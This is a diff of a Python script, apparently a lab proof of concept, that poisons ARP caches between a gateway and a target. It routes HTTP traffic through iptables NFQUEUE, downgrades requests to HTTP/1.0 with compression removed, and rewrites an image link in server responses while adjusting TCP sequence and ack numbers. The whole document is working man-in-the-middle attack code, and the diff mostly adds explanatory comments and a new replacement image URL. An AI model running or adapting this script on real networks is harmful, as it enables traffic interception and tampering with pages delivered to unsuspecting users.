@@ -10,6 +10,9 @@ import subprocess
 gateway_ip = "198.10.0.1"
 target_ip = "198.10.0.2"
 
+# !! hyrax pic
+replacement_img = "https://preview.redd.it/what-are-your-favorite-hyrax-pictures-accounts-memes-v0-j424z0j67eud1.jpg?width=968&format=pjpg&auto=webp&s=fac0062ae6781d56ffb8dbd32b325cc9da090506"
+
 def get_mac(ip_address):
     # Given an IP, get the MAC.
 
@@ -18,7 +21,6 @@ def get_mac(ip_address):
         return r[ARP].hwsrc
 
     return None
-
 
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
     packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
@@ -30,6 +32,11 @@ def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
         sendp(packet_to_target, verbose=False)
         sleep(2)
 
+# since we downgrade to http/1.0, multiple connections will be opened for each request
+# -> the browser will choose a random port each time
+# so we need to keep track of the byte offset for each connection
+# ! the sessions dict never actually gets cleared, so it's a memory leak :(
+# but it's ok, this is a PoC!
 sessions = {}
 
 def alter_packet(packet):
@@ -38,6 +45,8 @@ def alter_packet(packet):
     if packet.haslayer(IP) and packet.haslayer(TCP):
         sport, dport = packet[TCP].sport, packet[TCP].dport
         src_ip, dst_ip = packet[IP].src, packet[IP].dst
+
+        # unique session key based on source/destination IPs and ports
         session_key = tuple(sorted([sport, dport])) + tuple(sorted([src_ip, dst_ip]))
 
         if session_key not in sessions:
@@ -45,9 +54,11 @@ def alter_packet(packet):
 
         if sport == 80:
             # if http is sending to client (server container in this case)
+            # client needs to think seq number is higher than it actually is (we added some bytes)
             packet[TCP].seq += sessions[session_key]["byte_offset"]
         elif dport == 80:
             # if client (server container) is sending to http
+            # server needs to think ack number is lower than it actually is 
             packet[TCP].ack -= sessions[session_key]["byte_offset"]
         
     if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
@@ -57,23 +68,27 @@ def alter_packet(packet):
         payload_data = packet[Raw].load
         
         if dport == 80:
+            # if client (server container) is sending to http
+            # downgrade to http/1.0 and remove gzip, if content is compressed, we can't modify it
             if b"Accept-Encoding: gzip, deflate" in packet[Raw].load:
                 packet[Raw].load = packet[Raw].load.replace(b"Accept-Encoding: gzip, deflate", b"Accept-Encoding: identity     ")
             if b"HTTP/1.1" in packet[Raw].load:
                 packet[Raw].load = packet[Raw].load.replace(b"HTTP/1.1", b"HTTP/1.0")
 
         if sport == 80:
+            # if http is sending to client (server container in this case)
+            # replace the image in the response with a different one
             search_query = b'src="unibuc_fisiere/header.jpg"'
             target_image = payload_data.find(search_query)
             
             if target_image != -1:
-                new_data = payload_data.replace(b'src="unibuc_fisiere/header.jpg"', b'src="https://haveibeenpwned.com/Images/Hero.svg"')
+                new_data = payload_data.replace(b'src="unibuc_fisiere/header.jpg"', f'src="{replacement_img}"'.encode())
                 total_offset = len(new_data) - len(payload_data)
 
                 sessions[session_key]["byte_offset"] += total_offset
                 packet[Raw].load = new_data
 
-
+    # deleting packet length & checksum causes scapy to recalculate them for us (muahahah)
     if packet.haslayer(IP):
         del packet[IP].len
         del packet[IP].chksum
@@ -96,6 +111,7 @@ def process_packet(packet):
     modified_bytes = bytes(scapy_packet)
     
     if len(modified_bytes) != original_length:
+        # if we modify packet length, we need to drop the original packet and send the modified one
         packet.drop()
         send(scapy_packet, verbose=False)
     else:
@@ -129,9 +145,9 @@ if __name__ == "__main__":
 
         queue = NFQ()
 
-        # Intercept HTTP requests (going to port 80)
+        # Intercept HTTP requests (going to port 80), aka add them to the queue for processing
         subprocess.run(["iptables", "-I", "FORWARD", "-p", "tcp", "--dport", "80", "-j", "NFQUEUE", "--queue-num", "5"], check=True)
-        # Intercept HTTP responses (coming from port 80)
+        # Intercept HTTP responses (coming from port 80) aka add them to the queue for processing
         subprocess.run(["iptables", "-I", "FORWARD", "-p", "tcp", "--sport", "80", "-j", "NFQUEUE", "--queue-num", "5"], check=True)
         queue.bind(5, process_packet)
         queue.run()
